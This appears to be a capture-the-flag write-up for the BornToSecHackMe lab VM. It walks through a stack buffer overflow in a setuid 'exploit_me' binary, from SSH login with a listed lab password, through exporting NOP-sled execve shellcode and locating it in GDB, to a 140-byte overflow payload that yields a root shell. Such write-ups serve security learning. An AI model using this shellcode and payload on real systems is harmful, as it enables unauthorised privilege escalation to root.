# Writeup 5 - Buffer Overflow + Shellcode.

## Index:

- [What does this method consist of?](#what-does-this-method-consist-of)
- [1. SSH access as zaz](#1-ssh-access-as-zaz)
- [2. Export the Shellcode](#2-export-the-shellcode)
- [3. Locate shellcode address](#3-locate-shellcode-address)
- [4. Build the payload](#4-build-the-payload)

## What does this method consist of?

This is the same `exploit_me` binary as **writeup1**, but with a different technique. Instead of `Ret2LibC`, we use `shellcode`.

In writeup1, we overwrote the `EIP` with the address of `system()` in the libc directory. Here, we inject our own machine code into an environment variable and redirect the `EIP` to that address. The shellcode calls `execve` via syscall to obtain a root shell.

The **NOP sled** (`\x90` × 100) is a buffer of empty instructions before the shellcode. If the `EIP` points to any NOP, it will slide execution to the shellcode without failing.

### 1. SSH access as zaz

We connect via ssh with the user `zaz`:

- User: zaz
- Pasword: 646da671ca01bb5d84dbb5fb2238dc8e

```bash
ssh zaz@192.168.0.35
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.0.35's password: 
zaz@BornToSecHackMe:~$ 
```

### 2. Export the Shellcode

Once inside, we export the shellcode with a NOP sled as an environment variable:
```bash
zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'")
zaz@BornToSecHackMe:~$ 
```

### 3. Locate shellcode address

Once exported, we start GDB to find the shellcode's memory address without the full output.

We open GDB and use this trick to directly find the environment variable's address with `getenv`:
```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
(gdb) b main
(gdb) r test
(gdb) p (char*)getenv("SHELLCODE")
$1 = 0xbffff8aa "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
(gdb) 
```

## **Shellcode address: 0xbffff8aa**

### 4. Build the payload

Now we exit `gdb` and construct the payload using that address in little endian.

The payload is identical to that of `writeup1`: **140 bytes of padding** plus the little endian address of the shellcode:
```text
(gdb) q
```
```bash
./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
```

And we execute:
```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# 
```
## **ROOT obtained with shellcode. euid=0 (root privileges).**
